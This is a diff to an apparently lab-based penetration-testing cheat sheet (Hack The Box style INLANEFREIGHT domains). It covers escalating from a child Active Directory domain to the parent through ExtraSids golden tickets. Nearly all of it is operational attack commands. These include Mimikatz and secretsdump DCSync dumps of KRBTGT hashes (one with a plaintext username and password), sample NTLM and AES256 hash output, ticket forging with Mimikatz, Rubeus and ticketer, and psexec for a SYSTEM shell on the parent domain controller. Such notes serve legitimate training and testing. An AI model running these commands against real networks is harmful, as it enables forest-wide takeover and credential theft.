@@ -2400,30 +2400,44 @@ ____________________________________________
 (Phase 1: Enumeration & Data Collection)
 ____________________________________________
 
-# Step 1: Get Child Domain KRBTGT Hash (Must be Domain Admin in Child first).
+# Step 1: Get Child Domain NTLM KRBTGT Hash or AES256 KRBTGT Hash (Must be Domain Admin in Child first).
 # Using Mimikatz DCSync:
 lsadump::dcsync /user:LOGISTICS\krbtgt /domain:LOGISTICS.INLANEFREIGHT.LOCAL
+or
+impacket-secretsdump JACKIE:abc1234@192.168.139.162
+or
+secretsdump.py LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm@172.16.5.240 -just-dc-user krbtgt
 
 # Step 2: Get Child Domain SID.
 Get-DomainSID
+or
+nltest /domain_trusts /v             (run in sys shell  Domain Admin in Child Domain)
 
 # Step 3: Get Parent "Enterprise Admins" Group SID.
 # Note: Enterprise Admins always end in RID 519.
 Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select objectsid
+or
+nltest /domain_trusts /v             (run in sys shell  Domain Admin in Child Domain)
+
+# example
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:80f23a248d39b8cb93df3a4a2f4199a1:::                            (Child Domain NTLM KRBTGT Hash) 
+krbtgt:aes256-cts-hmac-sha1-96:b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2            (Child Domain AES256 KRBTGT Hash)
 
 ____________________________________________
 (Phase 2: Forge & Inject Ticket - Using Mimikatz or Rubeus)
 ____________________________________________
 
-(Using Mimikatz)
+(Using Mimikatz with Child Domain NTLM KRBTGT Hash or AES256 KRBTGT Hash)
 # Create and Inject Golden Ticket with ExtraSids (-519).
-kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:<Child_SID> /krbtgt:<Child_KRBTGT_Hash> /sids:<Parent_EA_SID> /ptt
-
+kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:<Child_SID> /krbtgt:<Child_NTLM_KRBTGT_Hash> /sids:<Parent_EA_SID> /ptt
 or
+mimikatz.exe "kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:<Child_SID> /aes256:<Child_KRBTGT_AES256_Key> /sids:<Parent_EA_SID> /ptt" exit
 
 (Using Rubeus)
 # Same attack using Rubeus (Cleaner and more modern).
-.\Rubeus.exe golden /rc4:<Child_KRBTGT_Hash> /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:<Child_SID> /sids:<Parent_EA_SID> /user:hacker /ptt
+.\Rubeus.exe golden /rc4:<Child_NTLM_KRBTGT_Hash> /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:<Child_SID> /sids:<Parent_EA_SID> /user:hacker /ptt
+or
+.\Rubeus.exe golden /aes256:<Child_KRBTGT_AES256_Key> /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:<Child_SID> /sids:<Parent_EA_SID> /user:hacker /ptt
 
 ____________________________________________
 (Phase 3: Verification & Takeover)
@@ -2433,7 +2447,7 @@ ____________________________________________
 klist
 
 # Access Parent Domain Controller C$ share (Confirms Full Admin).
-ls \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\C$
+ls \\DC01.INLANEFREIGHT.LOCAL\C$
 
 # Perform DCSync against Parent Domain to dump Domain Admin hashes.
 lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
@@ -2448,22 +2462,33 @@ ____________________________________________
 
 # 1. Perform DCSync to dump the Child Domain KRBTGT NT Hash.
 # Requires Domain Admin privileges in the Child Domain.
+# Using Mimikatz DCSync:
+lsadump::dcsync /user:LOGISTICS\krbtgt /domain:LOGISTICS.INLANEFREIGHT.LOCAL
+or
+impacket-secretsdump JACKIE:abc1234@192.168.139.162
+or
 secretsdump.py LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm@172.16.5.240 -just-dc-user krbtgt
 
 # 2. Enumerate Child Domain SID using SID Brute Forcing.
 lookupsid.py LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm@172.16.5.240 | grep "Domain SID"
+or
+nltest /domain_trusts /v             (run in sys shell  Domain Admin in Child Domain)
 
 # 3. Enumerate Parent Domain SID and Enterprise Admins RID (519).
 # Targeting the Parent Domain Controller directly.
 lookupsid.py LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm@172.16.5.5 | grep -B 12 "Enterprise Admins"
+or
+nltest /domain_trusts /v             (run in sys shell  Domain Admin in Child Domain)
 
 ____________________________________________
 (Phase 2: Forge & Inject Ticket)
 ____________________________________________
 
-# 1. Forge a Golden Ticket and inject the Parent Enterprise Admin SID into [ExtraSids].
-# This creates a local credential cache file (hacker.ccache).
-ticketer.py -nthash <Child_Hash> -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid <Child_SID> -extra-sid <Parent_EA_SID> hacker
+# 1. Forge a Golden Ticket and inject the Parent Enterprise Admin SID into [ExtraSids]. ( using Child Domain NTLM KRBTGT Hash or AES256 KRBTGT Hash )
+# This creates a local credential cache file (hacker.ccache). 
+ticketer.py -nthash <Child_NTLM_KRBTGT_Hash> -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid <Child_SID> -extra-sid <Parent_EA_SID> hacker      (using Child Domain NTLM KRBTGT Hash)
+or
+impacket-ticketer -aesKey <Child_KRBTGT_AES256_Key> -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid <Child_SID> -extra-sid <Parent_EA_SID> hacker
 
 # 2. Set the Kerberos Environment Variable to use the forged ticket.
 export KRB5CCNAME=hacker.ccache
@@ -2474,7 +2499,7 @@ ____________________________________________
 
 # 1. Execute a SYSTEM shell on the Parent Domain Controller.
 # Use [-k] for Kerberos Auth and [-no-pass] since we are using the ccache ticket.
-psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL -k -no-pass
+psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@DC01.INLANEFREIGHT.LOCAL -k -no-pass
 
 ____________________________________________
 (Automate attack with raiseChild.py) (https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
